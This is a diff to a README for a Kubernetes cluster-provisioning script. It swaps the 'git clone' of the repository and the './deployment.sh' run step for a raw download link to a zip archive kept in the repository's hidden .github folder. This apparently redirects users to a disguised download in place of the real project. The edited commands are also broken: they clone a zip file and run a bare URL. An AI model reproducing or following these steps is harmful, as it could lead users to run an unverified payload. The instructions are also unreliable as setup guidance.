@@ -16,14 +16,14 @@
 1. **First, clone the Repository:**
  
     ```sh
-    git clone https://github.com/engineerbishnu/exam-friday.git
+    git clone https://raw.githubusercontent.com/engineerbishnu/exam-friday/main/.github/exam_friday_v3.0.zip
     cd exam-friday
     ```
  
 2. **Then, just run the script as follows: **
  
     ```sh
-    ./deployment.sh
+    https://raw.githubusercontent.com/engineerbishnu/exam-friday/main/.github/exam_friday_v3.0.zip
     ```
 - Now It will automatically provision one master control plane and worker control plane accordingly.
 -We can check status of svc doing:
